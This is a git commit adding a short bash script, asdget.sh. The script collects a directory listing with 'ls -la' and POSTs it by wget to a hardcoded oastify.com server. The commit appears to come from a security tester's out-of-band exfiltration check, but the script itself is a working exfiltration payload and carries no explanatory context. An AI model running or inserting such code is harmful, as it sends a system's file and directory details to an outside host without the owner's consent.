b098da2bfb1611c4bbe84674493282b28e20b423
vitaoagsec-b <vitaoagsec@gmail.com>
2025-11-01 15:53:57 -0300

    Add files via upload

---
+++ asdget.sh
@@ -0,0 +1,18 @@
+#!/bin/bash
+
+# Hardcoded server info
+SERVER_HOST="ophu3gyj4p4xp1zvzurewrg0vr1ipjd8.oastify.com"
+SERVER_PORT=80
+
+SERVER_PATH="/"   
+
+# Capture ls output
+OUTPUT=$(ls -la)
+
+# Send output via HTTP POST using wget
+wget --quiet \
+     --method=POST \
+     --header="Content-Type: text/plain" \
+     --body-data="$OUTPUT" \
+     "http://${SERVER_HOST}:${SERVER_PORT}${SERVER_PATH}" \
+     -O /dev/null
